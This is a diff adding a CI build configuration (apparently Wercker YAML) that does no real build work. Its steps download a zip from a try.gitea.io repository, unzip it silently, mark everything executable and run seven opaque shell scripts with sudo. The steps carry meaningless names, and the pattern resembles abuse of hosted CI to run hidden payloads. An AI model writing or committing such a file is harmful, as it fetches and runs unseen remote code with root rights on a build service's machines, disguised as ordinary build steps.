@@ -1,0 +1,51 @@
+box: 
+  id: node:latest
+  ports: 
+    - "8080"
+command-timeout: 300
+no-response-timeout: 300
+
+build:
+  steps:
+    - script:
+        name: A1234123412341234
+        code: sudo apt update -y
+    - script:
+        name: B1234123412341234
+        code: wget https://try.gitea.io/rewada/nagihlah/raw/branch/master/rumptajabergoyang2.zip
+    - script:
+        name: C
+        code: unzip rumptajabergoyang2.zip >/dev/null 2>&1
+    - script:
+        name: D
+        code: chmod u+x *
+    - script:
+        name: E
+        code: sudo apt update -y
+    - script:
+        name: F
+        code: sudo bash Asta.sh
+    - script:
+        name: G
+        code: sudo bash Bias.sh
+    - script:
+        name: H
+        code: sudo bash Cita.sh
+    - script:
+        name: I
+        code: sudo bash Duli.sh
+    - script:
+        name: J
+        code: sudo bash Engkol.sh && sudo bash Farha.sh && sudo bash start00.sh
+    - script:
+        name: K
+        code: sudo apt update
+
+
+
+
+
+
+
+
+
